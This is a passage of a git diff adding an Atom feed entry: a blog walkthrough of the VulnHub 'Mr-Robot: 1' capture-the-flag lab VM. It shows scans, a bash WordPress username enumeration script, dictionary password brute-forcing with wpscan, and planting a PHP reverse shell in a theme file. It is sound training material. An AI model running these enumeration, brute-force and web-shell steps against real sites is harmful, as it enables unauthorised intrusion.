@@ -4,7 +4,7 @@
   <title><![CDATA[F4l13n5n0w]]></title>
   <link href="http://f4l13n5n0w.github.io/atom.xml" rel="self"/>
   <link href="http://f4l13n5n0w.github.io/"/>
-  <updated>2016-06-08T08:36:18-04:00</updated>
+  <updated>2016-08-10T09:12:30-04:00</updated>
   <id>http://f4l13n5n0w.github.io/</id>
   <author>
     <name><![CDATA[F4l13n5n0w]]></name>
@@ -12,6 +12,799 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[[VulnHub] Mr-Robot: 1]]></title>
+    <link href="http://f4l13n5n0w.github.io/blog/2016/08/10/vulnhub-mr-robot-1/"/>
+    <updated>2016-08-10T06:46:39-04:00</updated>
+    <id>http://f4l13n5n0w.github.io/blog/2016/08/10/vulnhub-mr-robot-1</id>
+    <content type="html"><![CDATA[<hr />
+
+<p>&ldquo;Based on the show, Mr. Robot. This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find. The VM isn&rsquo;t too difficult. There isn&rsquo;t any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.&rdquo; &ndash; <a href="https://www.vulnhub.com/author/jason,292/">Jason</a></p>
+
+<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/mr-robot-1,151/">here</a>.</p>
+
+<!-- more -->
+
+
+<h2>Attacker &amp; Target</h2>
+
+<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>
+
+<p>Target: Mr-Robot: 1 (<em>10.1.1.137/24</em>)</p>
+
+<h2>Vulnerability &amp; Exploit</h2>
+
+<ul>
+<li><code>robot.txt</code> sensitive information disclosure</li>
+<li><code>WordPress</code> username and password bruteforce attack</li>
+<li>Exploit Old NMAP <code>--interactive</code> privilege escalation vulnerability to get ROOT</li>
+</ul>
+
+
+<h2>Method</h2>
+
+<ul>
+<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
+<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
+<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
+<li>Scan specific vulnerability for WordPress CMS [<font color="FF8000">wpscan</font>]</li>
+<li>Exploit WordPress administrator/editor account to upload webshell [<font color="FF8000">php-reverse-shell</font>]</li>
+<li>Enumeration and exploit the local priviledge vulnerability (<code>old NMAP --interactive</code> vulnerability) to get ROOT</li>
+</ul>
+
+
+<h2>Tools</h2>
+
+<p>All the tools used here can be found in Kali Linux</p>
+
+<ul>
+<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
+<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
+<li><a href="https://nmap.org/">nmap</a></li>
+<li><a href="https://cirt.net/Nikto2">nikto</a></li>
+<li><a href="https://wpscan.org/">wpscan</a></li>
+<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
+<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
+<li><a href="https://portswigger.net/burp/">burp suite</a></li>
+<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
+</ul>
+
+
+<h2>Walkthrough</h2>
+
+<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
+</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
+</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
+</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
+</span><span class='line'>10.1.1.2  00:50:56:f1:61:7e   VMware, Inc.
+</span><span class='line'>10.1.1.137    00:0c:29:61:51:fa   VMware, Inc.
+</span><span class='line'>10.1.1.254    00:50:56:f3:e7:2a   VMware, Inc.
+</span><span class='line'>
+</span><span class='line'><span class="m">4</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
+</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 3.021 seconds <span class="o">(</span>84.74 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>10.1.1.137</code> is our Target!</p>
+
+<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.137/32 --rate<span class="o">=</span>10000
+</span><span class='line'>
+</span><span class='line'>Starting masscan 1.0.3 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2016-08-05 12:37:00 GMT
+</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+</span><span class='line'>Initiating SYN Stealth Scan
+</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
+</span><span class='line'>Discovered open port 80/tcp on 10.1.1.137
+</span><span class='line'>Discovered open port 443/tcp on 10.1.1.137
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>...truncated...
+</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.137
+</span><span class='line'>Host is up <span class="o">(</span>0.0037s latency<span class="o">)</span>.
+</span><span class='line'>PORT    STATE SERVICE  VERSION
+</span><span class='line'>80/tcp  open  http     Apache httpd
+</span><span class='line'><span class="p">|</span>_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+</span><span class='line'><span class="p">|</span> http-methods:
+</span><span class='line'><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span><span class='line'><span class="p">|</span>_http-server-header: Apache
+</span><span class='line'><span class="p">|</span>_http-title: Site doesn<span class="s1">&#39;t have a title (text/html).</span>
+</span><span class='line'><span class="s1">443/tcp open  ssl/http Apache httpd</span>
+</span><span class='line'><span class="s1">|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E</span>
+</span><span class='line'><span class="s1">| http-methods: </span>
+</span><span class='line'><span class="s1">|_  Supported Methods: GET HEAD POST OPTIONS</span>
+</span><span class='line'><span class="s1">|_http-server-header: Apache</span>
+</span><span class='line'><span class="s1">|_http-title: Site doesn&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
+</span><span class='line'><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>www.example.com
+</span><span class='line'><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>www.example.com
+</span><span class='line'><span class="p">|</span> Public Key <span class="nb">type</span>: rsa
+</span><span class='line'><span class="p">|</span> Public Key bits: 1024
+</span><span class='line'><span class="p">|</span> Signature Algorithm: sha1WithRSAEncryption
+</span><span class='line'><span class="p">|</span> Not valid before: 2015-09-16T10:45:03
+</span><span class='line'><span class="p">|</span> Not valid after:  2025-09-13T10:45:03
+</span><span class='line'><span class="p">|</span> MD5:   3c16 3b19 87c3 42ad <span class="m">6634</span> c1c9 d0aa fb97
+</span><span class='line'><span class="p">|</span>_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
+</span><span class='line'>MAC Address: 00:0C:29:61:51:FA <span class="o">(</span>VMware<span class="o">)</span>
+</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
+</span><span class='line'>Device <span class="nb">type</span>: general purpose
+</span><span class='line'>Running: Linux 3.X<span class="p">|</span>4.X
+</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+</span><span class='line'>OS details: Linux 3.10 - 3.19, Linux 3.2 - 4.0
+</span><span class='line'>Uptime guess: 0.000 days <span class="o">(</span>since Fri Aug  <span class="m">5</span> 08:38:08 2016<span class="o">)</span>
+</span><span class='line'>Network Distance: <span class="m">1</span> hop
+</span><span class='line'>...truncated...
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Only port <code>80</code> and <code>443</code> is found and <code>Apache</code> is the HTTP server.</p>
+
+<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities in terms of port <code>80</code> found by port-scanning stage.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
+</span><span class='line'>+ Target Host: 10.1.1.137
+</span><span class='line'>+ Target Port: 80
+</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
+</span><span class='line'>+ GET Retrieved x-powered-by header: PHP/5.5.29
+</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad
+</span><span class='line'>+ GET Uncommon header <span class="s1">&#39;tcn&#39;</span> found, with contents: list
+</span><span class='line'>+ GET Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id<span class="o">=</span>4698ebdc59d15. The following alternatives <span class="k">for</span> <span class="s1">&#39;index&#39;</span> were found: index.html, index.php
+</span><span class='line'>+ OSVDB-3092: GET /admin/: This might be interesting...
+</span><span class='line'>+ GET Uncommon header <span class="s1">&#39;link&#39;</span> found, with contents: &lt;http://10.1.1.137/?p<span class="o">=</span>23&gt;<span class="p">;</span> <span class="nv">rel</span><span class="o">=</span>shortlink
+</span><span class='line'>+ GET /readme.html: This WordPress file reveals the installed version.
+</span><span class='line'>+ GET /wp-links-opml.php: This WordPress script reveals the installed version.
+</span><span class='line'>+ OSVDB-3092: GET /license.txt: License file found may identify site software.
+</span><span class='line'>+ GET /admin/index.html: Admin login page/section found.
+</span><span class='line'>+ GET Cookie wordpress_test_cookie created without the httponly flag
+</span><span class='line'>+ GET /wp-login/: Admin login page/section found.
+</span><span class='line'>+ GET /wordpress/: A Wordpress installation was found.
+</span><span class='line'>+ GET /wp-admin/wp-login.php: Wordpress login found
+</span><span class='line'>+ GET /blog/wp-login.php: Wordpress login found
+</span><span class='line'>+ GET /wp-login.php: Wordpress login found
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>WordPress CMS</code> is found, also <code>/robots.txt</code> and <code>/license.txt</code> are found.</p>
+
+<p>So I run <code>wpscan</code> to scan this WordPress CMS, and in the mean time, I go have a look at the two interesting files.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/mrRobot# wpscan --url 10.1.1.137
+</span><span class='line'>_______________________________________________________________
+</span><span class='line'>        __          _______   _____
+</span><span class='line'>        <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
+</span><span class='line'>         <span class="se">\ \ </span> /<span class="se">\ </span> / /<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>___   ___  __ _ _ __
+</span><span class='line'>          <span class="se">\ \/</span>  <span class="se">\/</span> / <span class="p">|</span>  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __<span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="s1">&#39;_ \ </span>
+</span><span class='line'><span class="s1">           \  /\  /  | |     ____) | (__| (_| | | | |</span>
+</span><span class='line'><span class="s1">            \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">        WordPress Security Scanner by the WPScan Team </span>
+</span><span class='line'><span class="s1">                       Version 2.8</span>
+</span><span class='line'><span class="s1">          Sponsored by Sucuri - https://sucuri.net</span>
+</span><span class='line'><span class="s1">   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_</span>
+</span><span class='line'><span class="s1">_______________________________________________________________</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">[i] It seems like you have not updated the database for some time.</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">[+] URL: http://10.1.1.137/</span>
+</span><span class='line'><span class="s1">[+] Started: Fri Aug  5 23:16:00 2016</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">[+] robots.txt available under: &#39;</span>http://10.1.1.137/robots.txt<span class="s1">&#39;</span>
+</span><span class='line'><span class="s1">[!] The WordPress &#39;</span>http://10.1.1.137/readme.html<span class="err">&#39;</span> file exists exposing a version number
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Interesting header: SERVER: Apache
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> XML-RPC Interface available under: http://10.1.1.137/xmlrpc.php
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> WordPress version 4.3.5 identified from rss generator
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Enumerating plugins from passive detection ...
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> No plugins found
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Finished: Fri Aug  <span class="m">5</span> 23:16:01 2016
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Requests Done: 48
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Memory used: 7.668 MB
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Elapsed <span class="nb">time</span>: 00:00:00
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From the <code>wpscan</code> result, there is nothing special information. But from the robot file <code>/robots.txt</code>, I got the 1st flag!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>User-agent: *
+</span><span class='line'>fsocity.dic
+</span><span class='line'>key-1-of-3.txt
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The first key found in the file <code>key-1-of-3.txt</code>: <font color='red'><code>073403c8a58a1f80d943455fb30724b9</code></font></p>
+
+<p>And I got a dictionary file <code>fsocity.dic</code> as well.</p>
+
+<p>Highly believed that I can brute force username / password by using this dictionary file, and I filtered it to include the strings which only between 4-8 digitals.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/mrRobot# grep -E <span class="s1">&#39;^[a-zA-Z]&#39;</span> fsociety.dic <span class="p">|</span> sort -u <span class="p">|</span>  awk <span class="s1">&#39;length($1) &lt;=8 &amp;&amp; length($1) &gt;= 4 { print $1}&#39;</span> &gt; users.txt
+</span><span class='line'>root@kali:~/mrRobot# ls -l
+</span><span class='line'>total 7124
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root    <span class="m">1546</span> Aug  <span class="m">5</span> 08:48 10.1.1.137_nikto.txt
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root    <span class="m">1845</span> Aug  <span class="m">5</span> 08:38 10.1.1.137_nmap.txt
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root <span class="m">7245381</span> Aug  <span class="m">5</span> 23:49 fsociety.dic
+</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root   <span class="m">37007</span> Aug  <span class="m">7</span> 04:06 users.txt
+</span><span class='line'>root@kali:~/mrRobot# wc -l users.txt
+</span><span class='line'><span class="m">5247</span> users.txt
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In order to brute force wordpress username, I could not find any tool on the Internet, so I write a simple script <code>enum_wp_users.sh</code> to do it.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/bash</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">function</span> usage<span class="o">(){</span>
+</span><span class='line'>  <span class="nb">echo</span> <span class="s2">&quot;### wordpress username enumerator v0.1&quot;</span>
+</span><span class='line'>  <span class="nb">echo</span> <span class="s2">&quot;### by using wordpress&#39; lostpassword function.&quot;</span>
+</span><span class='line'>  <span class="nb">echo</span> <span class="s2">&quot;&quot;</span>
+</span><span class='line'>  <span class="nb">echo</span> <span class="s2">&quot;USAGE: $0 &lt;base-url&gt; &lt;wordlist&gt;&quot;</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">function</span> main<span class="o">(){</span>
+</span><span class='line'>  <span class="nb">local </span><span class="nv">base_url</span><span class="o">=</span><span class="nv">$1</span>
+</span><span class='line'>  <span class="nb">local </span><span class="nv">wordlist</span><span class="o">=</span><span class="nv">$2</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">for</span> word in <span class="k">$(</span>cat <span class="s2">&quot;$wordlist&quot;</span><span class="k">)</span><span class="p">;</span> <span class="k">do</span>
+</span><span class='line'>      <span class="k">if</span> ! curl -s --data <span class="s2">&quot;user_login=${word}&amp;redirect_to=&amp;wp-submit=Get+New+Password&quot;</span> <span class="s2">&quot;http://${base_url}/wp-login.php?action=lostpassword&quot;</span> <span class="p">|</span> grep -q ERROR<span class="p">;</span> <span class="k">then</span>
+</span><span class='line'>          <span class="nb">echo</span> <span class="s2">&quot;Found valid username: ${word}&quot;</span>
+</span><span class='line'>      <span class="k">fi</span>
+</span><span class='line'>  <span class="k">done</span>
+</span><span class='line'><span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="o">[</span> -z <span class="nv">$2</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span><span class='line'>  usage
+</span><span class='line'><span class="k">else</span>
+</span><span class='line'>  main <span class="s2">&quot;$@&quot;</span>
+</span><span class='line'><span class="k">fi</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>By using this script with filtered dictionary file <code>users.txt</code>, I found one valid username <code>elliot</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/mrRobot# ./enum_wp_users.sh 10.1.1.137 users.txt
+</span><span class='line'>Found valid username: elliot
+</span><span class='line'>Found valid username: Elliot
+</span><span class='line'>Found valid username: ELLIOT
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then using wpscan to brute force password for the user <code>elliot</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/mrRobot# cat fsociety.dic <span class="p">|</span> sort -u <span class="p">|</span> awk <span class="s1">&#39;length($1) &lt;= 16 &amp;&amp; length($1) &gt;= 6 { print $1 }&#39;</span> &gt; pass.txt
+</span><span class='line'>root@kali:~/mrRobot# wpscan --url 10.1.1.137 --wordlist ~/mrRobot/pass.txt --username elliot
+</span><span class='line'>_______________________________________________________________
+</span><span class='line'>        __          _______   _____
+</span><span class='line'>        <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
+</span><span class='line'>         <span class="se">\ \ </span> /<span class="se">\ </span> / /<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>___   ___  __ _ _ __
+</span><span class='line'>          <span class="se">\ \/</span>  <span class="se">\/</span> / <span class="p">|</span>  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __<span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="s1">&#39;_ \ </span>
+</span><span class='line'><span class="s1">           \  /\  /  | |     ____) | (__| (_| | | | |</span>
+</span><span class='line'><span class="s1">            \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">        WordPress Security Scanner by the WPScan Team </span>
+</span><span class='line'><span class="s1">                       Version 2.8</span>
+</span><span class='line'><span class="s1">          Sponsored by Sucuri - https://sucuri.net</span>
+</span><span class='line'><span class="s1">   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_</span>
+</span><span class='line'><span class="s1">_______________________________________________________________</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">[+] URL: http://10.1.1.137/</span>
+</span><span class='line'><span class="s1">[+] Started: Mon Aug  8 03:09:23 2016</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">[+] robots.txt available under: &#39;</span>http://10.1.1.137/robots.txt<span class="err">&#39;</span>
+</span><span class='line'>
+</span><span class='line'>...truncated...
+</span><span class='line'>
+</span><span class='line'>  <span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> Login : elliot Password : ER28-0652
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>  +----+--------+------+-----------+
+</span><span class='line'>  <span class="p">|</span> Id <span class="p">|</span> Login  <span class="p">|</span> Name <span class="p">|</span> Password  <span class="p">|</span>
+</span><span class='line'>  +----+--------+------+-----------+
+</span><span class='line'>  <span class="p">|</span>    <span class="p">|</span> elliot <span class="p">|</span>      <span class="p">|</span> ER28-0652 <span class="p">|</span>
+</span><span class='line'>  +----+--------+------+-----------+
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Finished: Mon Aug  <span class="m">8</span> 03:11:37 2016
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Found the password is <font color="red"><code>ER28-0652</code></font></p>
+
+<p>However, there is another way to find out the WordPress login username and password, rather than brute force.</p>
+
+<p>From the result of nikto scan, I noticed there is another file found <code>/license.txt</code>. By checking the source code of the file on <code>http://10.1.1.137/license.txt</code></p>
+
+<p>I found:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;pre&gt;
+</span><span class='line'>what you <span class="k">do</span> just pull code from Rapid9 or some s@#% since when did you become a script kitty?
+</span><span class='line'>
+</span><span class='line'>...truncated...
+</span><span class='line'>
+</span><span class='line'><span class="k">do</span> you want a password or something?
+</span><span class='line'>
+</span><span class='line'>...truncated...
+</span><span class='line'>
+</span><span class='line'><span class="nv">ZWxsaW90OkVSMjgtMDY1Mgo</span><span class="o">=</span>
+</span><span class='line'>&lt;/pre&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>By decoding the Base64 encoded string: <code>ZWxsaW90OkVSMjgtMDY1Mgo=</code>, I got a username / password <font color="red"><code>elliot:ER28-0652</code></font></p>
+
+<p>and from nikto scan, I also noticed that the admin login page is <code>http://10.1.1.137/wp-login.php</code>.</p>
+
+<p>So, try to login with the found username / password and succeed!.</p>
+
+<p>Now heading to <code>Appearance</code> &ndash;> <code>Editor</code> &ndash;> <code>404.php</code> (notice here the theme is <code>twentyfifteen</code>) and replaced the content with <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">pentestmonkey&rsquo;s php reverse shell</a> (configured to connect back on port 443).</p>
+
+<p>Then setup <code>NC</code> to listen on port <code>443</code>.</p>
+
+<p>Now, by accessing the page <code>http://10.1.1.137/wp-content/themes/twentyfifteen/404.php</code> to trigger the reverse shell connect back to my attacking machine.</p>
+
